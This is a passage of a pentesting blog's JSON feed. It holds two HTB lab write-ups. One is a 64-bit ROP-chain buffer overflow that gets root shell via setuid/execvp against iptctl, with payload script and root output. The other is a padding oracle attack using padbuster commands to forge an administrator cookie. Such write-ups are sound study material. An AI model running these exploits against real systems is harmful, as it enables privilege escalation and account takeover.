class=\"s\">\"</span>                                                                                                   <span class=\"n\">setuid_addr</span> <span class=\"o\">=</span> <span class=\"s\">\"</span><span class=\"se\">\\x80\\x07\\x40\\x00\\x00\\x00\\x00\\x00</span><span class=\"s\">\"</span>                                <span class=\"n\">null</span> <span class=\"o\">=</span> <span class=\"s\">\"</span><span class=\"se\">\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00</span><span class=\"s\">\"</span>                                                                                <span class=\"n\">payload</span> <span class=\"o\">=</span> <span class=\"s\">\"allow\"</span> <span class=\"o\">+</span> <span class=\"s\">\"A\"</span><span class=\"o\">*</span><span class=\"mi\">29</span><span class=\"n\">payload</span> <span class=\"o\">+=</span> <span class=\"n\">pop_rdi_addr</span> <span class=\"o\">+</span> <span class=\"n\">null</span> <span class=\"o\">+</span> <span class=\"n\">setuid_addr</span><span class=\"n\">payload</span> <span class=\"o\">+=</span> <span class=\"n\">pop_rdi_addr</span> <span class=\"o\">+</span> <span class=\"n\">sh_addr</span> <span class=\"o\">+</span> <span class=\"n\">pop_rsi_pop_r15_addr</span> <span class=\"o\">+</span> <span class=\"n\">null</span> <span class=\"o\">+</span> <span class=\"n\">null</span> <span class=\"o\">+</span> <span class=\"n\">execvp_addr</span> <span class=\"o\">+</span> <span class=\"s\">\"</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"n\">payload</span> <span class=\"o\">+=</span> <span class=\"s\">\"1.1.1.1\"</span> <span class=\"o\">+</span> <span class=\"s\">\"</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">payload</span><span class=\"p\">)</span></code></pre></div></div><ul>  <li>Copy this script any run on victim machine</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>penelope@redcross:/dev/shm<span class=\"nv\">$ </span><span class=\"o\">(</span>python2 bof.py<span class=\"p\">;</span><span class=\"nb\">cat</span> -<span class=\"o\">)</span> | /opt/iptctl/iptctl <span class=\"nt\">-i</span>Entering interactive mode<span class=\"nb\">id</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>1000<span class=\"o\">(</span>penelope<span class=\"o\">)</span> <span class=\"nv\">egid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span>,4<span class=\"o\">(</span>adm<span class=\"o\">)</span>,24<span class=\"o\">(</span>cdrom<span class=\"o\">)</span>,25<span class=\"o\">(</span>floppy<span class=\"o\">)</span>,29<span class=\"o\">(</span>audio<span class=\"o\">)</span>,30<span class=\"o\">(</span>dip<span class=\"o\">)</span>,44<span class=\"o\">(</span>video<span class=\"o\">)</span>,46<span class=\"o\">(</span>plugdev<span class=\"o\">)</span>,108<span class=\"o\">(</span>netdev<span class=\"o\">)</span>,112<span class=\"o\">(</span>lpadmin<span class=\"o\">)</span>,116<span class=\"o\">(</span>scanner<span class=\"o\">)</span>,1000<span class=\"o\">(</span>penelope<span class=\"o\">)</span>,1003<span class=\"o\">(</span>mailadm<span class=\"o\">)</span></code></pre></div></div><h2 id=\"explaining-the-payload-structure\">Explaining the payload structure</h2><p>First things to understand is how the calling conventions work for 32-bit and 64-bit architectures.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>execvp<span class=\"o\">()</span>NULLNULLpop rsi<span class=\"p\">;</span> pop r15<span class=\"p\">;</span> ret<span class=\"s2\">\"sh\"</span>pop rdi<span class=\"p\">;</span> retsetuid<span class=\"o\">()</span>NULLpop rdi<span class=\"p\">;</span> ret<span class=\"s2\">\"allow\"</span> + <span class=\"s2\">\"A\"</span><span class=\"k\">*</span>29</code></pre></div></div><p>To better understand, let’s divide the payload into different stack frames.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># stack frame 2</span>execvp<span class=\"o\">()</span>NULLNULLpop rsi<span class=\"p\">;</span> pop r15<span class=\"p\">;</span> ret<span class=\"s2\">\"sh\"</span>pop rdi<span class=\"p\">;</span> ret<span class=\"c\"># stack frame 1</span>setuid<span class=\"o\">()</span>NULLpop rdi<span class=\"p\">;</span> ret<span class=\"s2\">\"allow\"</span> + <span class=\"s2\">\"A\"</span><span class=\"k\">*</span>29</code></pre></div></div><p>Let’s take a closer look at stack frame 1.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\">## higher memory address ##</span><span class=\"c\"># Once the \"pop rdi\" instruction is finished executing, the</span><span class=\"c\"># next instructions is \"ret\". Since \"setuid()\" address is the</span><span class=\"c\"># next value from stack, the flow of execution will now go</span><span class=\"c\"># there completing our command `setuid(0)`.</span>setuid<span class=\"o\">()</span><span class=\"c\"># When the \"pop rdi\" instruction executes, it will pop</span><span class=\"c\"># the next value from the stack into RDI. That next value is</span><span class=\"c\"># NULL which is also equal to \"0\".</span>NULL<span class=\"c\"># This contains the address of \"pop rdi; ret\". Why do need it?</span><span class=\"c\"># In 64-bit calling convention, to pass a parameter to a</span><span class=\"c\"># function, in this case `setuid()`, we need to put the</span><span class=\"c\"># parameter into RDI. Then once its there, the function will</span><span class=\"c\"># get it in the form of `setuid(0)`.</span>pop rdi<span class=\"p\">;</span> ret<span class=\"c\"># This is the overflow part which will allow us to control the</span><span class=\"c\"># next instruction to execute which is on RIP. The next</span><span class=\"c\"># instruction will be on top of this.</span><span class=\"s2\">\"allow\"</span> + <span class=\"s2\">\"A\"</span><span class=\"k\">*</span>29<span class=\"c\">## lower memory address ##</span></code></pre></div></div><p>Then for stack frame 2.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\">## higher memory address ##</span><span class=\"c\"># When \"ret\" executes, it will go to address of instruction</span><span class=\"c\"># `execvp()` completing our final function call which is</span><span class=\"c\"># `execvp(\"sh\", NULL)`</span>execvp<span class=\"o\">()</span><span class=\"c\"># When \"pop r15\" executes, it will put NULL into RSI</span>NULL<span class=\"c\"># When \"pop rsi\" executes, it will put NULL into RSI</span>NULL<span class=\"c\"># When \"ret\" instruction executes, it will go to this</span><span class=\"c\"># instruction. Why do we need \"pop r15\"? Actually we don't</span><span class=\"c\"># need it. It just happened that there is no gadget which</span><span class=\"c\"># consists only of \"pop rsi\". So for completenes, we have no</span><span class=\"c\"># choice but to include also \"pop r15\" in our ROP chain.</span>pop rsi<span class=\"p\">;</span> pop r15<span class=\"p\">;</span> ret<span class=\"c\"># When \"pop rdi\" instruction executes, it will put \"sh\" into</span><span class=\"c\"># RDI since this is the next value in the stack.</span><span class=\"s2\">\"sh\"</span><span class=\"c\"># Continuing from previous stack frame, the next instruction</span><span class=\"c\"># to execute is \"pop rdi; ret\". In this case our target</span><span class=\"c\"># function call is `execvp()`. It accepts 2 parameters:</span><span class=\"c\">#  1. the string we want to execute in this case its</span><span class=\"c\">#     `/bin/sh` or just \"sh\". This should be put to RDI.</span><span class=\"c\">#  2. a NULL terminator and must be put to RSI.</span>pop rdi<span class=\"p\">;</span> ret<span class=\"c\">## lower memory address ##</span></code></pre></div></div><p>Here is also an illustration of stack flow of stack frame 1. Flow for stack frame 2 will be similar.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\">## stack view @ RIP \"pop_rdi_addr\"</span>setuid_addrnullpop_rdi_addr    <span class=\"c\"># --&gt; flow executions continues @ this addr</span><span class=\"c\">## stack view @ pop rdi</span>setuid_addrnull            <span class=\"c\"># --&gt; POP to RDI</span><span class=\"c\">## stack view @ ret</span>setuid_addr     <span class=\"c\"># --&gt; executes `setuid(0)`</span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB RedCross</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/01/15/bypass-aslr-nx-64-bit-rop-chain",
            
            
            
            "tags": ["bof","privesc"],
            
            "date_published": "2022-01-15T00:00:00+08:00",
            "date_modified": "2022-01-15T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2021/12/25/padding-oracle-attack",
            "title": "Padding Oracle Attack",
            "summary": "Padding Oracle Attack",
            "content_text": "OverviewCBD mode PKCS7 format uses padding to complete the block length when encrypting plaintext.Attacker can leverage this behaviour to get the plaintext by manipulating the ciphertext byte by byte in a trial and error fashion and observing whether the application will return error (invalid padding) or success (valid padding).This kind of crypto may be safe but the real attack surface is on whether your app is returning error on invalid padding which will give an attacker chance to brute force the correct plaintext.// example file from HTB lazyfunction decryptString($encryptedText, $passphrase) {  $encrypted = base64_decode($encryptedText);  $iv_size =  mcrypt_get_iv_size(MCRYPT_DES, MCRYPT_MODE_CBC);  $iv = substr($encrypted,0,$iv_size);  $dec = mcrypt_decrypt(MCRYPT_DES, $passphrase, substr($encrypted,$iv_size), MCRYPT_MODE_CBC, $iv);  $str = pkcs5_unpad($dec);  if ($str === false) {    echo \"Invalid padding\"; // really? you want to be hacked?    die();                  // maybe let's replace that or  }                         // remove entirely?  else {    return $str;  }}This is also a type of CCA or Chosen Ciphertext Attack.Details on ciphertext manipulationGo to “The Theory” part of this link.Detection  Try manipulating cookie values. See if webapp will error response such as invalid padding or 500,Exploitation  Using padbuster# installationsudo apt-get install padbuster# detectionpadbuster http://10.10.10.10/index.php \"RVJDQrwUdTRWJUVUeBKkEA==\" 8 -encoding 0 -cookies \"login=RVJDQrwUdTRWJUVUeBKkEA==\"# gets an admin cookiepadbuster http://10.10.10.10/index.php \"RVJDQrwUdTRWJUVUeBKkEA==\" 8 -encoding 0 -cookies \"login=RVJDQrwUdTRWJUVUeBKkEA==\" -plaintext \"user=administrator\"  Using bit flippingattack. Here is another resource from ippsec using Burp.References  Padding Oracle - HackTricks  HTB Lazy  Mathematical Explanation  The Padding Oracle Attack",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>CBD mode PKCS7 format uses padding to complete the block length when encrypting plaintext.</p><p><img src=\"/spindel/assets/Padding Oracle Attack/padding.png\" alt=\"\" /></p><p>Attacker can leverage this behaviour to get the plaintext by manipulating the ciphertext byte by byte in a trial and error fashion and observing whether the application will return error (invalid padding) or success (valid padding).</p><p>This kind of crypto may be safe but the real attack surface is on whether your app is returning error on invalid padding which will give an attacker chance to brute force the correct plaintext.</p><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// example file from HTB lazy</span><span class=\"k\">function</span> <span class=\"n\">decryptString</span><span class=\"p\">(</span><span class=\"nv\">$encryptedText</span><span class=\"p\">,</span> <span class=\"nv\">$passphrase</span><span class=\"p\">)</span> <span class=\"p\">{</span>  <span class=\"nv\">$encrypted</span> <span class=\"o\">=</span> <span class=\"nb\">base64_decode</span><span class=\"p\">(</span><span class=\"nv\">$encryptedText</span><span class=\"p\">);</span>  <span class=\"nv\">$iv_size</span> <span class=\"o\">=</span>  <span class=\"nb\">mcrypt_get_iv_size</span><span class=\"p\">(</span><span class=\"no\">MCRYPT_DES</span><span class=\"p\">,</span> <span class=\"no\">MCRYPT_MODE_CBC</span><span class=\"p\">);</span>  <span class=\"nv\">$iv</span> <span class=\"o\">=</span> <span class=\"nb\">substr</span><span class=\"p\">(</span><span class=\"nv\">$encrypted</span><span class=\"p\">,</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"nv\">$iv_size</span><span class=\"p\">);</span>  <span class=\"nv\">$dec</span> <span class=\"o\">=</span> <span class=\"nb\">mcrypt_decrypt</span><span class=\"p\">(</span><span class=\"no\">MCRYPT_DES</span><span class=\"p\">,</span> <span class=\"nv\">$passphrase</span><span class=\"p\">,</span> <span class=\"nb\">substr</span><span class=\"p\">(</span><span class=\"nv\">$encrypted</span><span class=\"p\">,</span><span class=\"nv\">$iv_size</span><span class=\"p\">),</span> <span class=\"no\">MCRYPT_MODE_CBC</span><span class=\"p\">,</span> <span class=\"nv\">$iv</span><span class=\"p\">);</span>  <span class=\"nv\">$str</span> <span class=\"o\">=</span> <span class=\"nf\">pkcs5_unpad</span><span class=\"p\">(</span><span class=\"nv\">$dec</span><span class=\"p\">);</span>  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nv\">$str</span> <span class=\"o\">===</span> <span class=\"kc\">false</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"k\">echo</span> <span class=\"s2\">\"Invalid padding\"</span><span class=\"p\">;</span> <span class=\"c1\">// really? you want to be hacked?</span>    <span class=\"k\">die</span><span class=\"p\">();</span>                  <span class=\"c1\">// maybe let's replace that or</span>  <span class=\"p\">}</span>                         <span class=\"c1\">// remove entirely?</span>  <span class=\"k\">else</span> <span class=\"p\">{</span>    <span class=\"k\">return</span> <span class=\"nv\">$str</span><span class=\"p\">;</span>  <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>This is also a type of CCA or Chosen Ciphertext Attack.</p><h2 id=\"details-on-ciphertext-manipulation\">Details on ciphertext manipulation</h2><p>Go to “The Theory” part of this <a href=\"https://pentesterlab.com/exercises/padding_oracle/course\">link</a>.</p><h2 id=\"detection\">Detection</h2><ul>  <li>Try manipulating cookie values. See if webapp will error response such as <code class=\"language-plaintext highlighter-rouge\">invalid padding</code> or <code class=\"language-plaintext highlighter-rouge\">500</code>,</li></ul><h2 id=\"exploitation\">Exploitation</h2><ul>  <li>Using padbuster</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># installation</span><span class=\"nb\">sudo </span>apt-get <span class=\"nb\">install </span>padbuster<span class=\"c\"># detection</span>padbuster http://10.10.10.10/index.php <span class=\"s2\">\"RVJDQrwUdTRWJUVUeBKkEA==\"</span> 8 <span class=\"nt\">-encoding</span> 0 <span class=\"nt\">-cookies</span> <span class=\"s2\">\"login=RVJDQrwUdTRWJUVUeBKkEA==\"</span><span class=\"c\"># gets an admin cookie</span>padbuster http://10.10.10.10/index.php <span class=\"s2\">\"RVJDQrwUdTRWJUVUeBKkEA==\"</span> 8 <span class=\"nt\">-encoding</span> 0 <span class=\"nt\">-cookies</span> <span class=\"s2\">\"login=RVJDQrwUdTRWJUVUeBKkEA==\"</span> <span class=\"nt\">-plaintext</span> <span class=\"s2\">\"user=administrator\"</span></code></pre></div></div><ul>  <li>Using <a href=\"https://0xdf.gitlab.io/2020/07/29/htb-lazy.html#path-2-bit-flip-attack\">bit flippingattack</a>. Here is another resource from <a href=\"https://www.youtube.com/watch?v=3VxZNflJqsw&amp;t=460s\">ippsec</a> using Burp.</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/cryptography/padding-oracle-priv#padding-oracle\">Padding Oracle - HackTricks</a></li>  <li><a href=\"https://www.youtube.com/watch?v=3VxZNflJqsw\">HTB Lazy</a></li>  <li><a href=\"https://www.youtube.com/watch?v=aH4DENMN_O4&amp;t=873s\">Mathematical Explanation</a></li>  <li><a href=\"https://robertheaton.com/2013/07/29/padding-oracle-attack/\">The Padding Oracle Attack</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2021/12/25/padding-oracle-attack",
            
            
            
            "tags": ["web","crypto","foothold"],
            
            "date_published": "2021-12-25T00:00:00+08:00",
            "date_modified": "2021-12-25T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        }
    
    ]
}